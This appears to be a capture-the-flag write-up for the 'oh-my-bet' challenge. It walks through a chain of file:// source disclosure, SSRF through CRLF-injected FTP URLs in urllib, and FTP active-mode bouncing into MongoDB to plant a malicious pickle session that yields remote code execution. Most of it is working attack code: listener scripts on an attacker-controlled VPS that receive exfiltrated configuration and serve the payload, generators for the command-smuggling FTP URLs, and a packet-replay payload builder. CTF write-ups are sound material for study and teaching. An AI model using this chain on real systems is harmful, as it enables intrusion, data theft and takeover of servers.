# oh-my-bet-EN

This is a challege to attack mongo by using FTP to construct SSRF and insert malicious pickle string into mongo, causing rce. The expected attack chain is

```
FTP->mongo->pickle->rce
```

First, in the avatat parameter of the registration page, you can use the file-protocol (`avatar=file:///etc/passwd`) to disclose the source code of the `app.py`. According to `app.py`, we can get `config.py` and `utils.py` and other files. In `utils.py`, we can find function `get_avatar` use `urllib.request.urlopen(path)` to get avatar picture, urllib itself supports FTP protocol (the latest version of Python does not support CLRF for FTP protocol, and the protection for CLRF was updated in an update in 2017. The original intention is to reduce the difficulty of challege. I chose Python 3.6.0, which supports CLRF for FTP protocol directly, but actually many people solved this challege without this feature).Combined with knowing an FTP server, we can first try to attack the FTP server to obtain some configuration information. We can use the following script on our own server to receive the configuration information from the intranet FTP server.

```
import socket

HOST = '0.0.0.0'
PORT = 1890
blocksize = 4096
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        while 1:
            data = conn.recv(blocksize)
            print(data)
            if not data:
                break
    print('end.')
```


And use the following script to generate the ftp url to get the configuration file

```
import urllib.request

# Download file
a = '''CWD files
TYPE I
PORT 1,1,1,1,0,1890   <---- 1,1,1,1 is your vps ip
RETR config.json
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)
```

According to the analysis of the source code and configuration files, we can find that there are five service containers running in the network. Before starting, the main web server will first request an FTP server with IP address of '172.20.0.2' to obtain the configuration information related to starting. The configuration information includes MySQL service  used for user login and registration, redis service used for caching user's avatar, and the mongodb service used for user session. The app uses `flask_session` to handle the users' session, `flask_session` stores a pickle string to mongo database, and generates session by deserializing the pickle string retrieved from mongo database at login.

So our attack plan has been roughly conceived, sending FTP protocol through urllib, using active mode (port) to let FTP server download a payload from our remote server that can insert a malicious pickle string that can cause rce into mongo, and then send the payload to mongo database by FTP (port), and insert the payload successfully. Finally, take this sessionid to visit the login page, and you can get the shell on your own server (note that there is no bash on the web server, only sh), and execute `/readflag` to get the flag.

Forge a payload inserted into a malicious pickle string to mongo, my choice is to replay the packet caught by wiershark. You can use `pymongo` to simulate sending the method of inserting a pickle string to your local mongo, and then use Wireshark to analyze the TCP flow, copy the raw data  and then use the following script to generate a payload

```
import struct

a = '''your raw data'''.replace('\n', '')

c = b''

def results(s):
    a = [int(s[i:i+2], 16) for i in range(0,len(s),2)]
    return a

z = results(a)

with open("bb2.txt", "wb") as f:
    for x in z:
        s = struct.pack('B', x)
        f.write(s)
```

You can use the following script to generate the url to upload the payload to the FTP server,

```
import urllib.request

# Upload file
a = '''TYPE I
PORT 1,1,1,1,0,1889  <---- 1,1,1,1 is your vps ip
STOR cc2.txt
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)
```

Set up a file upload service on your own server and wait for the FTP service of Intranet to get the file,

```
import socket

HOST = '0.0.0.0'  
PORT = 1889        
blocksize = 4096
fp = open('bb2.txt', 'rb')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    print('start listen...')
    s.listen()
    conn, addr = s.accept()
    with conn:
        while 1:
            buf = fp.read(blocksize)
            if not buf:
                fp.close()
                break
            conn.sendall(buf)
    print('end.')
```

Finally, the ftp url to attack mongo is generated,

```
import urllib.request

# Attack mongodb
a = '''TYPE I
PORT 172,20,0,5,0,27017
RETR cc2.txt
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)
```

After successfully inserting the pickle string, you can take sessionid to visit the login page, then you can get the shell on your own server, and finally you can get the flag by executing `/readflag`.